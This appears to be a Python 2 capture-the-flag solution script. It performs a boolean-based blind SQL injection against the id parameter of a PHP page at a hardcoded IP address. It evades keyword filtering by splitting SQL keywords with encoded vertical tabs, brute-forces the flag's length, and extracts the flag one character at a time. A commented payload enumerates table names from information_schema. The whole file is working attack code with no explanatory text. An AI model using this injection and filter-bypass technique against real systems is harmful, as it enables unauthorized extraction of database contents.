import requests

base_url = 'http://202.120.7.203/index.php?id=1 '
s = requests.session()
target_url = ''
password = ''

for i in xrange(40):
    payload = "and (sel%%0bect length(flag) fr%%0bom flag lim%%0bit 0,1)=%s %%23" % i
    target_url = base_url + payload
    r = s.get(target_url)
    if 'flag' in r.text:
        print "the length is %s" % i
        length = i
        break
# length = 15
# and (sel%0bect ascii(substring(TABLE_NAME,%s,1)) fr%0bom information_schema.TABLES wh%0bere table_schema = database() lim%0bit 1,1)=
for i in range(1, length + 1):
    # print "now cracking %s"%i
    for j in range(33, 127):
        payload_passwd = "and (sel%%0bect ascii(substring(flag, %s ,1)) fr%%0bom flag lim%%0bit 0,1)=%s %%23" % (i, j)
        target_url = base_url + payload_passwd
        r = s.get(target_url)
        # print r.content
        if 'flag' in r.text:
            password += chr(j)
            print 'flag is %s' % password
            break
